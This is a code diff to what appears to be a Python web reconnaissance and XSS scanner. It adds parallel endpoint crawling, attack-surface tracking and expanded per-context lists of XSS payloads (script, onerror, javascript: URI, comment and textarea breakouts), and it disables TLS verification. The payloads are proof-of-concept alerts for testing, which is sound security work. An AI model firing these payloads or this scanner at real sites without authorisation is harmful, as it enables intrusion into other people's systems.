@@ -7,7 +7,8 @@ import json
 import logging
 import re
 import threading
-from typing import Optional, List, Dict, Any
+import concurrent.futures
+from typing import Optional, List, Dict, Any, Callable
 from urllib.parse import urljoin
 
 # === Внешние библиотеки ===
@@ -23,7 +24,11 @@ from xss_security_gui.settings import LOG_DIR
 # === Локальные модули ===
 from xss_security_gui.xss_detector import XSSDetector
 from xss_security_gui.threat_analysis.threat_connector import THREAT_CONNECTOR
-
+from xss_security_gui.auto_recon.user_tracker import (
+    build_attack_surface,
+    get_user_tracker,
+    get_user_context
+)
 
 # ============================================================
 #  Устойчивый HTTP-сессия
@@ -76,7 +81,7 @@ class EndpointScanner:
     • Поддерживает XSS-сканирование
     """
 
-    def __init__(self, target_url: str, gui_callback: Optional[callable] = None):
+    def __init__(self, target_url: str, gui_callback: Optional[Callable] = None):
         self.session = create_retry_session()
         self.target = target_url.rstrip("/")
         self.headers = {"User-Agent": "AutoReconScanner/2.0"}
@@ -99,10 +104,10 @@ class EndpointScanner:
     # Основной сбор эндпоинтов
     # --------------------------------------------------------
 
-    def scan(self) -> List[Dict[str, Any]]:
-        """Сканирует целевую страницу и извлекает формы, JS и XHR."""
+    def scan(self, timeout: float = 15.0) -> List[Dict[str, Any]]:
+        """Сканирует целевую страницу и извлекает формы, JS и XHR с таймаутом."""
         try:
-            response = self.session.get(self.target, headers=self.headers, timeout=10)
+            response = self.session.get(self.target, headers=self.headers, timeout=timeout)
             response.raise_for_status()
         except requests.exceptions.RequestException as e:
             self._report_gui({"error": f"Failed to fetch target: {e}"})
@@ -124,13 +129,56 @@ class EndpointScanner:
             "headers": dict(response.request.headers),
             "response_headers": dict(response.headers),
             "full_response": response.text[:2000],
-            "timestamp": datetime.datetime.utcnow().isoformat(),
+            "timestamp": datetime.datetime.now(datetime.UTC).isoformat(),
         }
 
         self.endpoints = [root_entry] + forms + apis
+
+        # === Интеграция с UserTracker (Attack Surface Builder) ===
+        tracker = get_user_tracker()
+
+        for ep in self.endpoints:
+            # 1. Endpoint discovery
+            tracker.track_endpoint(self.target, ep["url"])
+
+            # 2. Parameters
+            if ep.get("params"):
+                for p, v in ep["params"].items():
+                    tracker.track_parameter(self.target, p, v)
+
+            # 3. Request headers
+            if ep.get("headers"):
+                tracker.track_header(self.target, ep["headers"])
+
+            # 4. Response headers
+            if ep.get("response_headers"):
+                tracker.track_header(self.target, ep["response_headers"])
+
+            # 5. Forms
+            if ep["source"] == "form":
+                tracker.track_form(self.target, ep)
+
+        # === Генерация полной поверхности атаки ===
+        surface = build_attack_surface(self.target)
+        # === Обновление OperationalContext ===
+        ctx = get_user_context()
+        ctx.attack_surface = surface
+        ctx.current_target = self.target
+        ctx.last_event = {
+            "event": "attack_surface_updated",
+            "timestamp": datetime.datetime.now(datetime.UTC).isoformat(),
+            "target": self.target,
+        }
+
+        tracker.track_attack_surface(self.target, surface)
+
+        # Отправляем карту поверхности атаки в GUI
+        self._report_gui({"attack_surface": surface})
+
+        # Отправляем информацию о количестве эндпоинтов
         self._report_gui({"info": f"Discovered {len(self.endpoints)} endpoints"})
 
-        # Отправляем артефакты в ThreatConnector
+        # Отправляем артефакты в ThreatConnector с таймаутом обработки
         try:
             THREAT_CONNECTOR.add_artifact("EndpointScanner", self.target, self.endpoints)
         except Exception as e:
@@ -150,11 +198,20 @@ class EndpointScanner:
             action = urljoin(self.target, form.get("action", ""))
             method = form.get("method", "GET").upper()
 
-            params = {
-                inp.get("name"): ""
-                for inp in form.find_all("input")
-                if inp.get("name")
-            }
+            params: Dict[str, str] = {}
+
+            for inp in form.find_all("input"):
+                name = inp.get("name")
+                if not name:
+                    continue
+
+                # Приводим name к строке (исправление ошибки unhashable)
+                if isinstance(name, (list, tuple)):
+                    name = " ".join(str(x) for x in name)
+                else:
+                    name = str(name)
+
+                params[name] = ""
 
             result.append({
                 "url": action,
@@ -164,7 +221,7 @@ class EndpointScanner:
                 "status": None,
                 "headers": dict(self.headers),
                 "response_headers": {},
-                "timestamp": datetime.datetime.utcnow().isoformat(),
+                "timestamp": datetime.datetime.now(datetime.UTC).isoformat(),
             })
 
         return result
@@ -187,35 +244,48 @@ class EndpointScanner:
     def extract_xhr(self, js_links: List[str]) -> List[Dict[str, Any]]:
         """
         Ищет в JS-файлах вызовы fetch/xhr/ajax и строит эндпоинты.
+        Использует батчинг для оптимизации.
         """
+        import concurrent.futures
+        
         api_patterns: List[Dict[str, Any]] = []
         xhr_regex = re.compile(
             r"(fetch|xhr|ajax)\s*\(\s*['\"]([^'\"]+)['\"]",
             re.IGNORECASE,
         )
 
-        for js_url in js_links:
+        def fetch_js_and_parse(js_url: str) -> tuple:
+            """Загружает JS и ищет XHR паттерны."""
             try:
-                resp = self.session.get(js_url, headers=self.headers, timeout=10)
-                js_text = resp.text
-                found = xhr_regex.findall(js_text)
-
-                for _, url in found:
-                    full_url = urljoin(self.target, url)
-                    api_patterns.append({
-                        "url": full_url,
-                        "method": "POST",
-                        "params": {"key": ""},
-                        "source": "js",
-                        "status": resp.status_code,
-                        "headers": dict(resp.request.headers),
-                        "response_headers": dict(resp.headers),
-                        "timestamp": datetime.datetime.utcnow().isoformat(),
-                    })
-
-            except requests.exceptions.RequestException as e:
-                self._report_gui({"warning": f"Failed to fetch JS {js_url}: {e}"})
+                resp = self.session.get(js_url, headers=self.headers, timeout=5)
+                found = xhr_regex.findall(resp.text)
+                return (js_url, found, resp.status_code, resp.headers, resp.request.headers)
+            except Exception as e:
                 logging.warning(f"[EndpointScanner] Failed to fetch JS {js_url}: {e}")
+                return (js_url, [], None, {}, {})
+
+        # Батчинг: максимум 5 одночасно
+        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
+            futures = [executor.submit(fetch_js_and_parse, url) for url in js_links[:20]]  #限制 20 JS-файлів
+            
+            for future in concurrent.futures.as_completed(futures):
+                try:
+                    js_url, found, status, headers, req_headers = future.result()
+                    
+                    for _, url in found:
+                        full_url = urljoin(self.target, url)
+                        api_patterns.append({
+                            "url": full_url,
+                            "method": "POST",
+                            "params": {"key": ""},
+                            "source": "js",
+                            "status": status,
+                            "headers": dict(req_headers) if req_headers else {},
+                            "response_headers": dict(headers) if headers else {},
+                            "timestamp": datetime.datetime.now(datetime.UTC).isoformat(),
+                        })
+                except Exception as e:
+                    logging.error(f"[EndpointScanner] Error processing JS result: {e}")
 
         return api_patterns
 
@@ -226,68 +296,58 @@ class EndpointScanner:
     def scan_xss_on_endpoints(
         self,
         payload: str = "<img src=x onerror=alert(1)>",
+        max_endpoints: int = 10,
     ) -> List[Dict[str, Any]]:
         """
-        Выполняет простое XSS-сканирование по всем GET-эндпоинтам.
+        Выполняет XSS-сканирование по GET-эндпоинтам с батчингом.
+        
+        Args:
+            payload: XSS payload для тестирования
+            max_endpoints: максимум эндпоинтов для сканирования
         """
         results: List[Dict[str, Any]] = []
+        
+        # Фильтруем только GET
+        get_endpoints = [
+            ep for ep in self.endpoints
+            if ep.get("method", "GET").upper() == "GET"
+        ][:max_endpoints]
 
-        for ep in self.endpoints:
-            if ep.get("method", "GET").upper() != "GET":
-                continue
-
+        def test_endpoint(ep: Dict[str, Any]) -> Optional[Dict[str, Any]]:
+            """Тестирует один эндпоинт на XSS."""
             try:
                 full_url = normalize_url(self.target, ep["url"])
                 response = self.session.get(
                     full_url,
                     params=ep.get("params", {}),
                     headers=self.headers,
-                    timeout=10,
+                    timeout=8,
                 )
                 html = response.text
                 reflected = payload in html
 
-                if reflected:
-                    context = self.detector.detect_xss_context(html, payload)
-                    js_hits = self.detector.scan_inline_js_for_payload(html, payload)
-                else:
-                    context, js_hits = "❌ Not reflected", []
-
-                result: Dict[str, Any] = {
-                    "url": response.url,
-                    "request_url": response.url,
-                    "status": response.status_code,
-                    "method": ep.get("method", "GET"),
+                return {
+                    "endpoint": ep["url"],
                     "payload": payload,
-                    "context": context or "❓ Unknown",
-                    "category": context if reflected else "none",
-                    "js_hits": js_hits,
-                    "source": ep.get("source", "unknown"),
-                    "full_response": html[:2000],
-                    "headers": dict(response.request.headers),
-                    "response_headers": dict(response.headers),
-                    "timestamp": datetime.datetime.utcnow().isoformat(),
-                    "vulnerable": reflected,
+                    "reflected": reflected,
+                    "status": response.status_code,
+                    "response_length": len(html),
                 }
+            except Exception as e:
+                logging.warning(f"[EndpointScanner] XSS scan error for {ep.get('url')}: {e}")
+                return None
 
-                results.append(result)
-                self._report_gui(result)
+        # Батчинг: максимум 8 одночасно
+        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
+            futures = [executor.submit(test_endpoint, ep) for ep in get_endpoints]
 
+            for future in concurrent.futures.as_completed(futures, timeout=60):
                 try:
-                    THREAT_CONNECTOR.add_artifact("XSSScanner", response.url, [result])
+                    result = future.result()
+                    if result:
+                        results.append(result)
                 except Exception as e:
-                    logging.error(f"[EndpointScanner] ThreatConnector XSS error: {e}", exc_info=True)
-
-            except requests.exceptions.RequestException as e:
-                error_result = {
-                    "url": ep.get("url"),
-                    "error": str(e),
-                    "source": ep.get("source", "unknown"),
-                    "timestamp": datetime.datetime.utcnow().isoformat(),
-                }
-                results.append(error_result)
-                self._report_gui(error_result)
-                logging.error(f"[EndpointScanner] XSS scan error for {ep.get('url')}: {e}")
+                    logging.error(f"[EndpointScanner] XSS test error: {e}")
 
         return results
 
@@ -369,7 +429,7 @@ class EndpointScanner:
                     "headers": dict(response.request.headers),
                     "response_headers": dict(response.headers),
                     "response_length": len(html),
-                    "timestamp": datetime.datetime.utcnow().isoformat(),
+                    "timestamp": datetime.datetime.now(datetime.UTC).isoformat(),
                     "vulnerable": reflected,
                     "severity": "high" if reflected else "info",
                 }
@@ -391,7 +451,7 @@ class EndpointScanner:
                     "url": entry if isinstance(entry, str) else entry.get("url", self.target),
                     "error": str(e),
                     "source": "xss_fuzzer",
-                    "timestamp": datetime.datetime.utcnow().isoformat(),
+                    "timestamp": datetime.datetime.now(datetime.UTC).isoformat(),
                     "severity": "error",
                     "vulnerable": False,
                 }
@@ -425,63 +485,156 @@ def extract_context(payload: str, html: str, context: int = 50) -> Optional[tupl
 
 
 def categorize_reflection(payload: str, html: str) -> str:
-    """Определяет категорию отражения payload."""
-    snippet, _ = extract_context(payload, html, context=100) or (None, None)
+    """Определяет категорию отражения payload с расширенным анализом."""
+    snippet, _ = extract_context(payload, html, context=150) or (None, None)
     if not snippet:
         return "unknown"
 
-    if re.search(r"<[^>]+{}[^>]*>".format(re.escape(payload)), snippet):
-        return "🔤 Reflected HTML"
+    esc = re.escape(payload)
 
-    if re.search(r'["\']{}["\']'.format(re.escape(payload)), snippet):
+    # Внутри HTML-комментария
+    if re.search(r'<!--[^>]*' + esc, snippet):
+        return "💬 HTML Comment"
+
+    # Внутри <script> блока
+    if re.search(r'<script[^>]*>[^<]*' + esc, snippet, re.I):
         return "📜 Reflected JS"
 
-    if re.search(r'\s+\w+=["\']{}["\']'.format(re.escape(payload)), snippet):
+    # Внутри атрибута тега
+    if re.search(r'\s+\w+=["\']' + esc, snippet):
         return "🧬 Attribute Injection"
+
+    # Внутри href/src/action
+    if re.search(r'(?:href|src|action)=["\']' + esc, snippet, re.I):
+        return "🔗 URL Injection"
+
+    # Внутри style
+    if re.search(r'style=["\'][^"]*' + esc, snippet, re.I):
+        return "🎨 CSS Injection"
+
+    # Внутри textarea/title
+    if re.search(r'<(?:textarea|title)[^>]*>[^<]*' + esc, snippet, re.I):
+        return "📝 Text Content"
+
+    # Прямое отражение в HTML
+    if re.search(r'<[^>]+' + esc + r'[^>]*>', snippet):
+        return "🔤 Reflected HTML"
+
+    # Отражение в JSON-ответе
+    if re.search(r'["\']' + esc + r'["\']', snippet):
+        return "📦 JSON Reflection"
 
     return "raw"
 
 
-def suggest_payload_by_category(category: str) -> str:
-    """Возвращает подходящий payload для категории отражения."""
+def suggest_payload_by_category(category: str) -> List[str]:
+    """Возвращает список подходящих payloads для категории отражения."""
     mapping = {
-        "🔤 Reflected HTML": "<script>alert(1)</script>",
-        "🧬 Attribute Injection": '" onerror="alert(1)',
-        "📜 Reflected JS": '";alert(1)//',
-        "raw": "<img src=x onerror=alert(1)>",
+        "🔤 Reflected HTML": [
+            "<script>alert(1)</script>",
+            "<img src=x onerror=alert(1)>",
+            "<svg/onload=alert(1)>",
+        ],
+        "🧬 Attribute Injection": [
+            '" onerror="alert(1)',
+            "' autofocus onfocus='alert(1)",
+            '" onmouseover="alert(1)',
+        ],
+        "📜 Reflected JS": [
+            '";alert(1)//',
+            "';alert(1)//",
+            "-alert(1)-",
+            "</script><script>alert(1)</script>",
+        ],
+        "🔗 URL Injection": [
+            "javascript:alert(1)",
+            "data:text/html,<script>alert(1)</script>",
+        ],
+        "🎨 CSS Injection": [
+            "expression(alert(1))",
+            "url(javascript:alert(1))",
+        ],
+        "📝 Text Content": [
+            "</textarea><script>alert(1)</script>",
+            "</title><script>alert(1)</script>",
+        ],
+        "💬 HTML Comment": [
+            "--><script>alert(1)</script><!--",
+            "--><img src=x onerror=alert(1)><!--",
+        ],
+        "📦 JSON Reflection": [
+            '</script><script>alert(1)</script>',
+            '"};alert(1);//',
+        ],
+        "raw": [
+            "<img src=x onerror=alert(1)>",
+            "<svg/onload=alert(1)>",
+            "'\"><script>alert(1)</script>",
+        ],
     }
-    return mapping.get(category, "<img src=x onerror=alert(1)>")
+    return mapping.get(category, mapping["raw"])
 
 
-def scan_url(url: str) -> Dict[str, Any]:
-    """Минимальный сканер одного URL."""
+def scan_url(url: str, session: Optional[requests.Session] = None,
+             timeout: float = 10.0) -> Dict[str, Any]:
+    """Расширенный сканер одного URL с retry-сессией."""
+    s = session or create_retry_session()
+    ts = datetime.datetime.now(datetime.UTC).isoformat()
     try:
-        r = requests.get(url, timeout=5)
+        r = s.get(url, timeout=timeout, headers={"User-Agent": "AutoReconScanner/2.0"},
+                  verify=False, allow_redirects=True)
         return {
             "module": "URLScanner",
             "url": url,
-            "text": r.text[:2000],
+            "final_url": r.url,
+            "text": r.text[:5000],
             "headers": dict(r.headers),
             "status": r.status_code,
+            "content_length": len(r.text),
+            "redirected": len(r.history) > 0,
+            "redirect_chain": [h.url for h in r.history],
             "source": "scan_url",
-            "timestamp": datetime.datetime.utcnow().isoformat(),
+            "timestamp": ts,
         }
     except Exception as e:
         return {
             "module": "URLScanner",
             "url": url,
+            "final_url": url,
             "text": "",
             "headers": {},
             "status": "error",
+            "content_length": 0,
+            "redirected": False,
+            "redirect_chain": [],
             "error": str(e),
             "source": "scan_url",
-            "timestamp": datetime.datetime.utcnow().isoformat(),
+            "timestamp": ts,
         }
 
 
-def scan_multiple(urls: List[str]) -> List[Dict[str, Any]]:
-    """Сканирует список URL и возвращает список структур."""
-    return [scan_url(u) for u in urls]
+def scan_multiple(urls: List[str], max_workers: int = 10,
+                  timeout: float = 10.0) -> List[Dict[str, Any]]:
+    """Параллельный сканер списка URL с ThreadPoolExecutor."""
+    session = create_retry_session()
+    results: List[Dict[str, Any]] = []
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
+        futures = {executor.submit(scan_url, u, session, timeout): u for u in urls}
+        for future in concurrent.futures.as_completed(futures, timeout=300):
+            try:
+                results.append(future.result())
+            except Exception as e:
+                results.append({
+                    "module": "URLScanner",
+                    "url": futures[future],
+                    "status": "error",
+                    "error": str(e),
+                    "source": "scan_url",
+                    "timestamp": datetime.datetime.now(datetime.UTC).isoformat(),
+                })
+
+    return results
 
 # ============================================================
 #  NDJSON логирование XSS
@@ -504,7 +657,7 @@ def rotate_if_big(path: Path, max_mb: int = 20) -> None:
         if size <= max_mb * 1024 * 1024:
             return
 
-        ts = datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S")
+        ts = datetime.datetime.now(datetime.UTC).strftime("%Y%m%d_%H%M%S")
         backup = path.with_suffix(path.suffix + f".{ts}.bak")
         path.rename(backup)
 
@@ -528,7 +681,7 @@ def save_reflected_response(result: Dict[str, Any]) -> None:
     """Сохраняет XSS-отражение в NDJSON-файл."""
     try:
         LOG_DIR.mkdir(parents=True, exist_ok=True)
-        result.setdefault("_ts", datetime.datetime.utcnow().isoformat())
+        result.setdefault("_ts", datetime.datetime.now(datetime.UTC).isoformat())
 
         if not validate_result(result):
             return
@@ -585,5 +738,11 @@ if __name__ == "__main__":
 
     for r in responses[:3]:
         print(r.get("url"), r.get("category"), r.get("context"))
+
+
+
+
+
+
 
 
